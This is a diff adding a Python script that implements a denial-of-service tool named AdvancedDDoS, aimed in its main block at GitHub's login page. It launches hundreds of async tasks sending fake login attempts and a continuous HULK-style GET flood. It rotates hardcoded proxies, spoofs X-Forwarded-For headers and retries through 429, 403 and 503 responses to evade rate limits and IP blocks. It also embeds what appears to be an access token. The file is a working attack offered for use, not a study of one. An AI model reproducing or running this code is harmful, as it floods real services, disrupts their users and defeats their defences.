@@ -1,0 +1,197 @@
+import asyncio
+import aiohttp
+import random
+import logging
+import time
+import socket
+import string
+from aiohttp.client_exceptions import ClientConnectionError, ClientResponseError, ServerTimeoutError
+from datetime import datetime
+import requests
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger()
+
+GREEN = '\033[92m'
+RED = '\033[91m'
+RESET = '\033[0m'
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.70",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+]
+
+PROXIES = [
+    'http://5.161.99.252:8888', 
+    'http://5.161.65.47:8888', 
+    'http://5.161.101.60:8888'
+]
+
+def generate_fake_data():
+    fake_username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    fake_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+    return fake_username, fake_password
+
+class AdvancedDDoS:
+    def __init__(self, target_url, num_threads=500, max_retries=1, attack_duration=3600, github_token=None):
+        self.target_url = target_url
+        self.num_threads = num_threads
+        self.max_retries = max_retries
+        self.attack_duration = attack_duration
+        self.github_token = github_token
+        self.session = None
+        self.start_time = time.time()
+        self.proxies = PROXIES
+        self.proxy_index = 0
+        self.success_count = 0
+        self.failed_count = 0
+        self.total_requests = 0
+
+    async def is_https_alive(self):
+        try:
+            logger.info(f"Checking if {self.target_url} is alive...")
+            async with aiohttp.ClientSession() as session:
+                async with session.get(self.target_url, timeout=5) as response:
+                    if response.status == 200:
+                        logger.info(f"{self.target_url} is alive!")
+                        return True
+                    else:
+                        logger.error(f"{self.target_url} is not alive. Status code: {response.status}")
+                        return False
+        except Exception as e:
+            logger.error(f"Error checking {self.target_url}: {e}")
+            return False
+
+    async def rotate_proxy(self):
+        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
+        return self.proxies[self.proxy_index]
+
+    async def send_request(self, retries=0, proxy=None):
+        try:
+            fake_username, fake_password = generate_fake_data()
+
+            headers = {
+                'User-Agent': random.choice(USER_AGENTS),
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Referer': self.target_url,
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Connection': 'keep-alive',
+                'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
+                'Accept-Encoding': random.choice(['gzip', 'deflate', 'br']),
+                'Host': self.target_url.split('//')[1],
+                'Content-Length': str(random.randint(100, 500)),
+            }
+
+            if self.github_token:
+                headers['Authorization'] = f'Bearer {self.github_token}'
+
+            await asyncio.sleep(random.uniform(1, 2))
+
+            if not proxy:
+                proxy = await self.rotate_proxy()
+
+            method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'HEAD'])
+
+            data = {
+                'username': fake_username,
+                'password': fake_password,
+                'captcha': random.randint(1000, 9999)
+            }
+
+            if retries > self.max_retries:
+                logger.error(f"Maximum retries reached for this attack.")
+                return "Failed"
+
+            try:
+                async with self.session.request(method, self.target_url, headers=headers, data=data, proxy=proxy, timeout=10) as response:
+                    self.total_requests += 1
+                    if response.status == 200:
+                        self.success_count += 1
+                        logger.info(f"{GREEN}Success: Fake login attempt sent successfully!{RESET}")
+                        return "Success"
+                    elif response.status == 429:
+                        logger.warning(f"Rate limit hit! Status code {response.status}, retrying...")
+                        await asyncio.sleep(random.uniform(3, 5))
+                        return await self.send_request(retries + 1, proxy)
+                    elif response.status == 403:
+                        logger.warning(f"IP blocked (403). Trying another proxy...")
+                        return await self.send_request(retries + 1)
+                    elif response.status == 503:
+                        logger.warning(f"Service Unavailable (503). Retrying...")
+                        await asyncio.sleep(random.uniform(5, 10))
+                        return await self.send_request(retries + 1, proxy)
+                    else:
+                        self.failed_count += 1
+                        logger.error(f"{RED}Failed: Status code {response.status}{RESET}")
+                        return "Failed"
+            except (ClientConnectionError, ClientResponseError, ServerTimeoutError) as e:
+                logger.warning(f"Request failed: {e}. Retrying...")
+                await asyncio.sleep(2 ** retries + random.uniform(0, 10))
+                return await self.send_request(retries + 1, proxy)
+        except Exception as e:
+            logger.error(f"Attack failed: {e}")
+            return "Failed"
+
+    async def hulk_attack(self):
+        headers = {
+            'User-Agent': random.choice(USER_AGENTS),
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive',
+            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
+        }
+        while True:
+            try:
+                async with self.session.get(self.target_url, headers=headers, timeout=5) as response:
+                    if response.status == 200:
+                        self.success_count += 1
+                        logger.info(f"{GREEN}Success: HULK-like request sent!{RESET}")
+                    else:
+                        self.failed_count += 1
+                        logger.error(f"{RED}Failed: Status code {response.status}{RESET}")
+            except Exception as e:
+                logger.warning(f"HULK attack error: {e}")
+            await asyncio.sleep(random.uniform(0.1, 0.5))
+
+    async def run_attack(self):
+        logger.info("Starting Advanced DDoS Attack...")
+
+        is_alive = await self.is_https_alive()
+        if not is_alive:
+            logger.error(f"{RED}Failed: Target is unreachable. Exiting...{RESET}")
+            return
+
+        async with aiohttp.ClientSession() as session:
+            self.session = session
+
+            attack_tasks = []
+
+            attack_tasks.append(asyncio.create_task(self.hulk_attack()))
+
+            for _ in range(self.num_threads):
+                attack_tasks.append(asyncio.create_task(self.send_request()))
+
+            await asyncio.gather(*attack_tasks)
+
+    def start(self):
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(self.run_attack())
+        end_time = time.time()
+        elapsed_time = end_time - self.start_time
+        logger.info(f"Attack completed! Total requests sent: {self.total_requests}")
+        logger.info(f"Total successful requests: {self.success_count}")
+        logger.info(f"Total failed requests: {self.failed_count}")
+        logger.info(f"Time taken for the attack: {elapsed_time:.2f} seconds")
+
+
+if __name__ == "__main__":
+    target_url = "https://github.com/login"
+    num_threads = 1
+    max_retries = 3
+    attack_duration = 3600
+    github_token = "rw/tlo/qzMmHCIBn1fUTHSCGDr8unEq7/yNYuy7AYxT99VDYRChXyjlOSx2BmRJDDVJrZptQdxMTHybhBAys6w=="
+
+    ddos = AdvancedDDoS(target_url, num_threads, max_retries, attack_duration, github_token)
+    ddos.start()
